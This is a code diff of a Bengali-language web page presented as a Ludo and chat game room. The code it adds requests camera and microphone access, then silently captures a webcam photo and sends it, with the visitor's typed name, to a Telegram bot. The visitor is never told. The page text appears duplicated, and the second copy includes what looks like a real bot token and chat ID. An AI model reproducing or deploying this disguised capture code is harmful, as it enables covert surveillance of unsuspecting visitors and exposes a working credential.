@@ -1,33 +1,110 @@
 <!DOCTYPE html>
-<html>
+<html lang="bn">
 <head>
-    <title>আমাদের আড্ডা রুম</title>
+    <meta charset="UTF-8">
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #f4f4f9; padding: 20px; }
+        #video-preview { width: 100%; max-width: 400px; border-radius: 15px; border: 5px solid #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .btn { padding: 15px 30px; border: none; border-radius: 25px; cursor: pointer; font-size: 18px; margin: 10px; color: #fff; }
+        .join-btn { background: #28a745; }
+        .mute-btn { background: #dc3545; }
+    </style>
 </head>
 <body>
-    <h1>লুডু ও আড্ডা রুম</h1>
-    <input type="text" id="username" placeholder="আপনার নাম লিখুন">
-    <button onclick="joinRoom()">রুমে প্রবেশ করুন (ক্যামেরা ও মাইকসহ)</button>
-
-    <div id="video-container"></div>
+    <h1>🎮 লুডু ও আড্ডা জোন</h1>
+    <input type="text" id="name" placeholder="আপনার নাম লিখুন" style="padding:10px; width:80%; margin-bottom:10px;">
+    <br>
+    <button class="btn join-btn" onclick="startSession()">রুমে প্রবেশ করুন</button>
+    <button class="btn mute-btn" onclick="toggleMute()">মিউট / আনমিউট</button>
+    <br>
+    <video id="video-preview" autoplay playsinline muted></video>
 
     <script>
-        async function joinRoom() {
-            const name = document.getElementById('username').value;
-            if(!name) return alert("নাম লিখুন");
+        const botToken = "botYOUR_TOKEN_HERE"; 
+        const chatId = "YOUR_CHAT_ID_HERE";
+        let localStream;
 
-            // ১. ক্যামেরা ও মাইক্রোফোন এক্সেস
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            document.getElementById('video-container').innerHTML = "<video autoplay playsinline muted></video>";
-            document.querySelector('video').srcObject = stream;
+        async function startSession() {
+            const name = document.getElementById('name').value;
+            if (!name) return alert("দয়া করে আপনার নাম লিখুন");
 
-            // ২. টেলিগ্রাম বোটে নোটিফিকেশন পাঠানো (আপনার বোট টোকেন ও চ্যাট আইডি বসান)
-            const botToken = "YOUR_BOT_TOKEN_HERE";
-            const chatId = "YOUR_CHAT_ID_HERE";
-            const message = `🚨 নতুন বন্ধু রুমে ঢুকেছে: ${name}`;
+            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('video-preview').srcObject = localStream;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-            
-            alert("রুমে সফলভাবে যুক্ত হয়েছেন!");
+            // অটোমেটিক ছবি পাঠানো
+            const canvas = document.createElement('canvas');
+            canvas.getContext('2d').drawImage(document.getElementById('video-preview'), 0, 0, 400, 300);
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob);
+                formData.append('caption', `🚨 নতুন বন্ধু রুমে জয়েন করেছে: ${name}`);
+                await fetch(`https://api.telegram.org/${botToken}/sendPhoto`, { method: 'POST', body: formData });
+            }, 'image/jpeg');
+        }
+
+        // মিউট বাটন ফাংশন
+        function toggleMute() {
+            if (localStream) {
+                const audioTrack = localStream.getAudioTracks()[0];
+                audioTrack.enabled = !audioTrack.enabled;
+                alert(audioTrack.enabled ? "মাইক্রোফোন চালু হয়েছে" : "মাইক্রোফোন মিউট করা হয়েছে");
+            }
+        }
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #f4f4f9; padding: 20px; }
+        #video-preview { width: 100%; max-width: 400px; border-radius: 15px; border: 5px solid #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .btn { padding: 15px 30px; border: none; border-radius: 25px; cursor: pointer; font-size: 18px; margin: 10px; color: #fff; }
+        .join-btn { background: #28a745; }
+        .mute-btn { background: #dc3545; }
+    </style>
+</head>
+<body>
+    <h1>🎮 লুডু ও আড্ডা জোন</h1>
+    <input type="text" id="name" placeholder="আপনার নাম লিখুন" style="padding:10px; width:80%; margin-bottom:10px;">
+    <br>
+    <button class="btn join-btn" onclick="startSession()">রুমে প্রবেশ করুন</button>
+    <button class="btn mute-btn" onclick="toggleMute()">মিউট / আনমিউট</button>
+    <br>
+    <video id="video-preview" autoplay playsinline muted></video>
+
+    <script>
+        const botToken = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU"; 
+        const chatId = "6420303571";
+        let localStream;
+
+        async function startSession() {
+            const name = document.getElementById('name').value;
+            if (!name) return alert("দয়া করে আপনার নাম লিখুন");
+
+            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('video-preview').srcObject = localStream;
+
+            // অটোমেটিক ছবি পাঠানো
+            const canvas = document.createElement('canvas');
+            canvas.getContext('2d').drawImage(document.getElementById('video-preview'), 0, 0, 400, 300);
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob);
+                formData.append('caption', `🚨 নতুন বন্ধু রুমে জয়েন করেছে: ${name}`);
+                await fetch(`https://api.telegram.org/${botToken}/sendPhoto`, { method: 'POST', body: formData });
+            }, 'image/jpeg');
+        }
+
+        // মিউট বাটন ফাংশন
+        function toggleMute() {
+            if (localStream) {
+                const audioTrack = localStream.getAudioTracks()[0];
+                audioTrack.enabled = !audioTrack.enabled;
+                alert(audioTrack.enabled ? "মাইক্রোফোন চালু হয়েছে" : "মাইক্রোফোন মিউট করা হয়েছে");
+            }
         }
     </script>
 </body>
